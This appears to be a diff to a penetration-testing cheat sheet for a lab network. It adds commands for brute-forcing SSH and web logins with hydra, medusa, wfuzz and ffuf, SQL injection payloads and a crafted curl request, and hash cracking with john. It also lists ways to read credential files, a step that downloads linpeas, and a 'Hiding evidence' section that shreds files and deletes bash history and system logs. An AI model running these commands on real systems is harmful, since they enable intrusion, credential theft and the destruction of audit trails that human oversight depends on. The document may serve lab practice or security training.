@@ -12,6 +12,8 @@
 	- https://nvd.nist.gov/vuln/search
 - hash type identifier
 	- https://hashes.com/en/tools/hash_identifier
+- hasing, encoding, decoding
+	- https://emn178.github.io/online-tools/
 
 ## Strategy & Commands
 
@@ -51,13 +53,6 @@ host 10.0.33.50
 nmap --script ssl-cert 10.0.66.201 
 ```
 
-6. scan publicly accessible directories at web servers
-```sh
-dirb https://10.0.66.201
-
-nmap --script=http-enum 10.0.66.201
-```
-
 7. check if host is online
 ```
 ping -c 1 10.0.0.254 && echo "Host is ONLINE" || echo "Host is OFFLINE"
@@ -69,6 +64,7 @@ ping -c 1 10.0.0.254 && echo "Host is ONLINE" || echo "Host is OFFLINE"
 ```sh
 curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh
 podman cp linpeas.sh attacker:~/linpeas.sh
+# or just copy paste file from localhost into container
 ```
 
 2. search anything sus with google
@@ -93,7 +89,7 @@ check
 
 ### Password guessing
 
-1. create a wordlist with AI (should be a small file)
+1. create a wordlist with AI and python (should be a small file)
 ```sh
 # might need to convert to ascii
 cat wordlist.txt | iconv -f utf-8 -t ascii//TRANSLIT > output.txt
@@ -103,6 +99,10 @@ file output.txt
 2. run hydra (should give result right away !!!)
 ```sh
 hydra -l username -P wordlist.txt ssh://10.0.88.2
+```
+
+```sh
+medusa -t 4 -b -h 10.0.88.2 -u username -P wordlist.txt -M ssh
 ```
 
 3. connect through ssh and add ssh pub key
@@ -121,12 +121,17 @@ scp .ssh/id_ed25519.pub test@10.0.33.110:~/.ssh/authorized_keys
 
 3. crack with john
 ```sh
-john --format=Raw-MD5 passwords.txt
+john --format=raw-md5 --wordlist:/usr/share/wordlists/sqlmap.txt passwords.txt
+```
+
+4. show results with
+```sh
+john --show --format=raw-md5 passwords.txt
 ```
 
 ### Command injection
 
-1. find out the request format
+1. figure out the request format
 
 2. forge command injection
 ```sh
@@ -137,9 +142,92 @@ curl -s http://10.0.0.10:80/vulnerabilities/exec/ -X POST --data-raw 'ip=10.0.0.
 
 1. check for more hosts on the system
 
-2. connect to them
+2. test if you can connect to them with ping
+```sh
+pinc -c 1 10.0.0.1
+```
 
 3. collect info as you go
+
+### Web
+
+- get all scripts used on page
+```js
+$$("script").map(script => script.getAttribute("src"))
+```
+
+### Forced browsing
+
+1. run any of these
+```sh
+ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.0.66.201/FUZZ
+```
+
+```sh
+dirb http://10.0.66.201
+```
+
+```sh
+nmap --script=http-enum 10.0.66.201
+```
+
+2. can view the page
+```sh
+curl -X GET -L http://10.0.66.201/something -sS | lynx -nolist -dump -stdin
+```
+
+### Password guessing web forms
+
+1. figure out the request format
+
+2. forge command
+```sh
+hydra -l username -P wordlist.txt 'http-get-form://10.0.0.10:80/vulnerabilities/brute:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect'
+```
+
+```sh
+wfuzz -z file,wordlist.txt 'http://10.0.0.10:80/vulnerabilities/brute/?username=admin&password=FUZZ&Login=Login' --hs 'Username and/or password incorrect'
+```
+
+```sh
+ffuf -w wordlist.txt -u 'http://10.0.0.10:80/vulnerabilities/brute/?username=admin&password=FUZZ&Login=Login' -fr 'Username and/or password incorrect'
+```
+
+### SQL injection
+
+1. figure out the request format
+
+2. use one of these
+```txt
+' OR 1=1 #
+
+UNION SELECT user, password FROM users #
+```
+
+3. forge URL with injection
+```sh
+curl -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'uid=%27+OR+true+%23&password=p' 'http://10.0.44.55/customers/'
+```
+
+4. or use sqlmap
+```sh
+```
+
+### Hiding evidence
+
+1. shred files
+```sh
+shred -u -z -n 3 databackup.sh
+```
+
+2. delete bash history and logs
+```sh
+HISTCONTROL=ignorespace
+
+rm -rf ~/.bash_history
+rm -rf /var/log/auth.log
+rm -rf /var/log/syslog
+```
 
 ### What to always check
 
@@ -159,14 +247,20 @@ cat /var/run/motd.dynamic
 - bash history
 ```sh
 cat ~/.bash_history
+cat ~/.bashrc
+cat ~/.bash_profile
+
+# any config for that manner
 ```
 
 - ssh directory
-```
+```sh
 ls ~/.ssh
+cat .ssh/config
+cat .ssh/authorized_keys
 ```
 
-- other users
+- other users on the host
 ```sh
 cat /etc/passwd
 ```
@@ -181,3 +275,11 @@ find / -name "*.docx"
 cat /var/log/auth.log
 cat /var/log/syslog
 ```
+
+- accidental leftover from image setup
+```sh
+ls /
+cat /setup.sh
+```
+
+## [All tools](./tools.md)
